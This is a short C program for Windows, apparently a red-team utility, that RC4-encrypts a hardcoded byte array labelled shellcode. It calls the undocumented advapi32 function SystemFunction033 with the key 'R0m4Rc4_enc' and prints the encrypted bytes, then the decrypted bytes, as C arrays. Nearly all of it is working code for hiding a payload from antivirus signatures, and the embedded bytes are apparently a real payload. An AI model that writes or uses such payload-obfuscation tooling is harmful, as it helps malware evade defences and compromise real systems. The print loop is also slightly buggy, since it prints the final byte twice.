
#include <windows.h>
#include <stdio.h>

typedef NTSTATUS(WINAPI* _SystemFunction033)(
	struct ustring* memoryRegion,
	struct ustring* keyPointer);

struct ustring {
	DWORD Length;
	DWORD MaximumLength;
	PUCHAR Buffer;
} _data, key;

int main() {
	printf("[*] RC4 Shellcode Encrypter using Systemfunction032/033\n");

	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");

	char _key[] = "R0m4Rc4_enc";

	unsigned char shellcode[] =
    {
        0x68, 0x75, 0x70, 0x27, 0x92, 0x87, 0xc3, 0x3a, 0xfe, 0x4e, 0x2b, 0xca, 0x70, 0x4a, 0x6f, 0x26,
        0xb7, 0x1a, 0xf4, 0x79, 0xb5, 0xde, 0x3b, 0xf7, 0xd6, 0x73, 0x03, 0x72, 0x00, 0x13, 0x1f, 0x64,
        0x99, 0x13, 0xe2, 0x75, 0x94, 0xe2, 0x9f, 0x64, 0xb2, 0xec, 0xc8, 0xfe, 0xce, 0x64, 0x79, 0x87,
        0xcf, 0x39, 0xf2, 0x8a, 0xfb, 0xbb, 0x73, 0x6b, 0x88, 0xef, 0x2a, 0x1a, 0x92, 0x10, 0xc2, 0x13,
        0xf5, 0x68, 0xbb, 0xbc, 0x47, 0x3d, 0x2d, 0x33, 0xef, 0x7c, 0x31, 0x3b, 0x8c, 0xe7, 0x40, 0xd3,
        0x8f, 0xc3, 0xbc, 0x6c, 0x65, 0x5e, 0xcc, 0x9c, 0x99, 0x0c, 0x8d, 0x40, 0x8b, 0xc0, 0xf5, 0x46,
        0x55, 0xcc, 0xa7, 0x4d, 0xdb, 0xdc, 0x61, 0x6b, 0x2c, 0x1a, 0x6b, 0x90, 0xc1, 0xf8, 0x05, 0xe3,
        0x91, 0x56, 0xe7, 0xe2, 0x82, 0x70, 0xd3, 0xd5, 0xec, 0xde, 0x9b, 0x92, 0xda, 0x6d, 0x17, 0x8e,
        0xa4, 0x1e, 0xfe, 0x35, 0xab, 0x51, 0xb0, 0xf8, 0xf2, 0x90, 0xb5, 0xfb, 0xb3, 0x8b, 0x00, 0x53,
        0x04, 0xaa, 0x73, 0x9f, 0xcc, 0x9f, 0x40, 0x61, 0xb0, 0x6f, 0xe7, 0x4d, 0x20, 0xfa, 0xd6, 0x1a,
        0x09, 0xa0, 0xf0, 0x32, 0xca, 0x92, 0x0d, 0xbd, 0xc2, 0x74, 0x0e, 0x36, 0x9d, 0xe5, 0x85, 0x99,
        0x38, 0x93, 0x8d, 0x11, 0x08, 0x37, 0x17, 0x7c, 0x44, 0xc0, 0x3e, 0x07, 0x41, 0x99, 0x0b, 0xbd,
        0x3a, 0x6e, 0xd8, 0x2c, 0xba, 0x2a, 0x94, 0xbd, 0x0d, 0xa2, 0x3e, 0x74, 0x65, 0x7a, 0x01, 0xfc,
        0x4a, 0xf0, 0x21, 0xc4, 0x34, 0x87, 0x36, 0xd5, 0xcf, 0xef, 0x57, 0x3f, 0x2b, 0x39, 0x0b, 0xd7,
        0x6a, 0x52, 0x74, 0x5d, 0x14, 0x6c, 0x82, 0x63, 0x66, 0xf4, 0x89, 0x6c, 0xc4, 0xe6, 0xcb, 0xa7,
        0xe2, 0x81, 0xd4, 0x68, 0x54, 0x7a, 0x41, 0xf0, 0xc1, 0x90, 0x20, 0x19, 0x4e, 0xbb, 0x15, 0xf0,
        0x0a, 0xe7, 0x7b, 0x63, 0xac, 0xe7, 0x94, 0xc5, 0xac, 0xf2, 0x2f, 0x54, 0x98, 0x93, 0xe6, 0xaf,
        0x1a, 0x1e, 0x36, 0x28, 0xc0, 0xee, 0x6d, 0x31, 0xf2, 0xc4, 0xa4, 0x20, 0x04, 0x7d, 0xe2, 0xf7,
        0xc7, 0xfb, 0xd8, 0x20, 0x62, 0x50, 0x92, 0x42, 0x8c, 0xca, 0xaf, 0x33, 0xe2, 0x2b, 0x56, 0xf0,
        0x2d, 0xe3, 0x37, 0xd7, 0x84, 0xb4, 0xeb, 0xf9, 0x7c, 0x6b, 0x78, 0x9d, 0xd4, 0xde, 0x63, 0xb3,
        0x7e, 0xdd, 0x06, 0x5b, 0x8c, 0x06, 0xab, 0xf0, 0xe9, 0x57, 0xbd, 0x47, 0xd5, 0x89, 0x31, 0x8b,
        0x77, 0x74, 0x7a, 0x30, 0xee, 0x1a, 0x40, 0xd4, 0xa3, 0x9e, 0xa8, 0xc3, 0x44, 0x73, 0x41, 0x02,
        0xb9, 0x3c, 0x8b, 0xb0, 0xa8, 0x77, 0x34, 0x18, 0x3d, 0xc9, 0x12, 0xa8, 0x4e, 0x46, 0x94, 0xee,
        0x04, 0x66, 0xe9, 0x5d, 0x4d, 0xca, 0x77, 0xf4, 0x03, 0x47, 0x6c, 0x82, 0x28, 0x76, 0x56, 0x28,
        0x31, 0x4d, 0xdd, 0x14, 0x84, 0x52, 0x1b, 0x22, 0xb8, 0x40, 0x2f, 0xa4, 0x9b, 0x6a, 0x60, 0x02,
        0x73, 0x56, 0x3c, 0xb1, 0x9c, 0xc9, 0x3d, 0x86, 0xfa, 0x38, 0x69, 0x00, 0x4c, 0x81, 0xc3, 0x44,
        0x19, 0xae, 0x62, 0x71, 0x29, 0x98, 0x5e, 0xf7, 0x7a, 0xc7, 0xd6, 0x44, 0xd8, 0xbb, 0x1d, 0xc5,
        0xe0, 0x24, 0x4c, 0xdf, 0xdc, 0x4d, 0xd4, 0x71, 0x16, 0x24, 0x67, 0x1c, 0x3e, 0xd3, 0x56, 0xad,
        0x00, 0x58, 0xbd, 0xd2, 0x61, 0x7c, 0xc2, 0x69, 0x3f, 0x3b, 0xdc, 0x87, 0x82, 0xce, 0xb5, 0xee,
        0x23, 0x61, 0x3e, 0x0d, 0x0e, 0xb6, 0xa6, 0x08, 0x49, 0xe4, 0x0e, 0xf6, 0xe4, 0x4f, 0xff, 0x4b,
        0xfa, 0xf1, 0x43, 0x31, 0xf9, 0x6d, 0x69, 0xc2, 0x15, 0x6f, 0x48, 0xfc, 0x00, 0x0d, 0x5b, 0x52,
        0x29, 0xd4, 0xcb, 0x97, 0x49, 0x5d, 0xa5, 0x24, 0x7a, 0x4a, 0x0b, 0x8f, 0x87, 0x12, 0xa4, 0xae, 0xae };


	key.Buffer = (PUCHAR)(&_key);
	key.Length = sizeof key;

	_data.Buffer = (PUCHAR)shellcode;
	_data.Length = sizeof shellcode;

	SystemFunction033(&_data, &key);

	printf("\nunsigned char shellcode[] = { ");
	for (size_t i = 0; i < _data.Length; i++) {
		if (!(i % 16)) printf("\n    ");
		printf("0x%02x, ", _data.Buffer[i]);
		if (i == _data.Length - 1) printf("0x%02x };", _data.Buffer[i]);
	}

	SystemFunction033(&_data, &key);

	printf("\nunsigned char shellcode[] = { ");
	for (size_t i = 0; i < _data.Length; i++) {
		if (!(i % 16)) printf("\n    ");
		printf("0x%02x, ", _data.Buffer[i]);
		if (i == _data.Length - 1) printf("0x%02x };", _data.Buffer[i]);
	}

}